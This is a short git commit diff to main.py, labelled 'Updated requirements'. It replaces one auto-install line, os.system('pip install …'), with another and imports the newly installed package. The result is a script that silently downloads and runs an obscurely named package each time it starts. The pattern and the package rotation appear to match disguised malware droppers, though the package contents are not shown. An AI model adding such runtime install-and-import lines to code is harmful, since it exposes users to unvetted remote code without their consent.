b020c9a12dc0f2a6b9f9fb59f04ccac733c9fdb9
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-12 23:25:40 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscryptpackageV1")
-import syscryptpackageV1
+os.system("pip install pysqlite3addonV1")
+import pysqlite3addonV1
 import random
 import requests
 import time
